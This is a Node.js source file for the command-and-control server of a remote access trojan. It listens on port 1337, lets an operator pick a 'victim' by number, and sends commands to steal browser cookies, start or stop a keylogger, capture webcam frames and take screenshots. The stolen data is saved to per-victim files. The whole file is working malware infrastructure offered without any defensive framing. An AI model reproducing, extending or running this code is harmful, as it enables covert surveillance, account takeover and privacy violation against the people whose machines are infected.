var net = require('net');
var fs = require('fs');

var sockets = [];

var server = net.createServer(function(socket) {    
    var socket_num = sockets.push(socket);
    
    socket.socket_num = socket_num;
    socket.isConnected = true;
    socket.image_counter = 0;
    
    console.log("connected " + socket.socket_num);
    
    socket.on('data', function(chunk) {
        data = String(chunk).split("<==>");
        
        if (data[0] == "cookies") {
            fs.writeFile("data/cookies" + socket.socket_num, data[1], function(err) {
                if (err) console.log(err);
            });
        } else if (data[0] == "keylogger") {
            fs.appendFile("data/keylogger" + socket.socket_num, data[1], function(err) {
                if (err) console.log(err);
            });
        } else if (data[0] == "web_cam_success") {
            var rawBuffer = Buffer.from(chunk, 'binary');
            socket.image_counter += 1;
            fs.appendFileSync("data/image" + socket.socket_num + "_" + socket.image_counter + ".png", rawBuffer.slice(19), "binary");
            console.log("Receiving Web Cam Frame...");
        } else if (data[0] == "web_cam_failure") {
            console.log("Failed to get web cam frame");
        } else if (data[0] == "screenshot_success") {
            var rawBuffer = Buffer.from(chunk, 'binary');
            socket.image_counter += 1;
            fs.appendFileSync("data/image" + socket.socket_num + "_" + socket.image_counter + ".png", rawBuffer.slice(22), "binary");
            console.log("Receiving Screenshot...");
        } else if (data[0] == "screenshot_failure") {
            console.log("Failed to get screenshot");
        } else {
            var rawBuffer = Buffer.from(chunk, 'binary');
            fs.appendFileSync("data/image" + socket.socket_num + "_" + socket.image_counter + ".png", rawBuffer, "binary");
        }
    });

    socket.on("error", function(err) {
        console.log("Victim " + socket.socket_num + " Disconnected");
        socket.isConnected = false;
    })
});

server.listen(1337);

commands = [
    "cookies",
    "start_keylogger",
    "stop_keylogger",
    "web_cam",
    "screenshot"
]

process.stdin.on('data', function (data) {
    data = String(data).replace(/(\r\n|\n|\r)/gm, "").split(" ");
    
    if (data.length != 2) {
        console.log("Usage: <victim number> <command: cookies | >");
    } else if (isNaN(data[0])) {
        console.log("Usage: <victim number> <command: cookies | >");
    } else if (data[0] + 1 > sockets.length) {
        console.log("Invalid victim number");
    } else if (! commands.includes(data[1])) {
        console.log("Invalid command");
    } else if (! sockets[data[0]].isConnected) {
        console.log("Victim disconnected");
    } else {
        socket = sockets[data[0]];
        
        socket.write(data[1]);
        socket.pipe(socket);
    }
});